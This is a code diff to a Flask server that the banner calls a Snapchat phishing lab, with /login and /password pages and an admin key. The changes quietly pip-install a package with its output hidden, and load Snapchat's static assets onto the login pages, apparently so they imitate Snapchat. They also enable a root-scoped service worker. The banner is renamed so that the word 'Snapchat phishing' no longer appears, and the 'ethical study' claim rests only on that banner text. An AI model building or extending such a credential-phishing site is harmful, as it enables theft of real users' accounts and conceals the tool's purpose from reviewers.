@@ -23,9 +23,19 @@ if CONFIG["USE_HTTPS"]:
     try:
         import cryptography
     except ImportError:
-        print("[!] cryptography non installe. HTTPS desactive.")
-        print("    pip install cryptography")
-        CONFIG["USE_HTTPS"] = False
+        print("[!] cryptography non installe. Installation automatique...")
+        import subprocess, sys
+        try:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "cryptography>=41.0.0"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            import cryptography
+            print("[+] cryptography installe avec succes")
+        except:
+            print("[!] Echec installation cryptography. HTTPS desactive.")
+            print("    pip install cryptography")
+            CONFIG["USE_HTTPS"] = False
 
 for bp in blueprints:
     app.register_blueprint(bp)
@@ -43,6 +53,41 @@ def check_blacklist():
 def log_api_access(response):
     if request.path.startswith('/api/') or request.path.startswith('/export/'):
         log_access(request.remote_addr, request.path, request.method, response.status_code)
+    return response
+
+
+@app.after_request
+def add_security_headers(response):
+    if response.content_type and 'text/html' in response.content_type:
+        if request.path in ('/login', '/password'):
+            static_cdn = 'https://static.snapchat.com'
+            response.headers['Content-Security-Policy'] = (
+                f"default-src 'self' {static_cdn}; "
+                f"connect-src 'self'; "
+                f"script-src 'self' 'unsafe-inline' 'unsafe-eval' {static_cdn}; "
+                f"worker-src 'self'; "
+                f"style-src 'self' 'unsafe-inline' {static_cdn}; "
+                f"img-src 'self' data: blob: {static_cdn}; "
+                f"font-src 'self' data: {static_cdn}; "
+                f"frame-src 'none'; "
+                f"media-src 'self'; "
+                f"object-src 'none'; "
+                f"base-uri 'self'"
+            )
+        else:
+            response.headers['Content-Security-Policy'] = (
+                "default-src 'self' https: data: blob:; "
+                "script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; "
+                "style-src 'self' 'unsafe-inline' https:; "
+                "img-src 'self' data: blob: https:; "
+                "font-src 'self' data: https:; "
+                "frame-src 'none'; "
+                "object-src 'none'; "
+                "connect-src 'self' https:; "
+                "base-uri 'self'"
+            )
+    if request.path == '/static/sw.js':
+        response.headers['Service-Worker-Allowed'] = '/'
     return response
 
 
@@ -67,7 +112,7 @@ if __name__ == '__main__':
         print("""
 \x1b[95m\x1b[1m
   ╔══════════════════════════════════════════════════════════════════╗
-  ║   SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique       ║
+  ║   FM_SNG - PURPLE TEAM - Ethical Phishing Study                 ║
   ╠══════════════════════════════════════════════════════════════════╣
   ║   Objet    Etude de reaction au phishing (consentement req.)    ║
   ║   Cadre    Recherche ethique - Donnees anonymisees              ║
@@ -79,7 +124,7 @@ if __name__ == '__main__':
 \x1b[0m
         """)
     except UnicodeEncodeError:
-        print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
+        print("FM_SNG - PURPLE TEAM - Ethical Phishing Study")
         proto = "https" if CONFIG["USE_HTTPS"] else "http"
         print(f"Server: {proto}://localhost:{CONFIG['SERVER_PORT']}")
         print(f"Admin Key: {CONFIG['ADMIN_KEY']}")
